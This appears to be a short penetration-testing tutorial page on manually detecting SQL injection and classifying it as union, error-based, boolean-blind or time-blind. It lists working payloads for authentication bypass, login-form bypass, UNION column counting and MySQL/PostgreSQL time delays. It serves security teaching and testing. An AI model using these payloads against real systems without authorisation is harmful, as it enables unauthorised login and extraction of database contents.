# 05.02 Manual SQLi Detection

> Send a single quote and classify the response into UNION, error-based, boolean-blind, or time-blind SQLi.

## Overview

Manually classify SQLi into Union-based, Error-based, Boolean-blind, or Time-blind. Each requires a different exploit technique. Always start with a single quote — does the page break?

## Steps

- **Break with `'`** — error, blank, or unchanged?
- **Boolean test** — `' AND 1=1-- -` vs `' AND 1=2-- -` give different responses?
- **Time-based** — `' AND SLEEP(5)-- -` (MySQL) — does the response delay?
- **UNION** — count columns with `ORDER BY n--`, then pull data.

## Commands

### Common payloads

```text
' OR '1'='1'-- -                       (auth bypass)
' UNION SELECT NULL,NULL,NULL-- -      (UNION column count)
' AND (SELECT SLEEP(5))-- -            (MySQL time)
' OR pg_sleep(5)-- -                   (PostgreSQL time)
' AND IF(1=1,SLEEP(5),0)-- -           (MySQL conditional)
admin'-- -                             (login form)
```
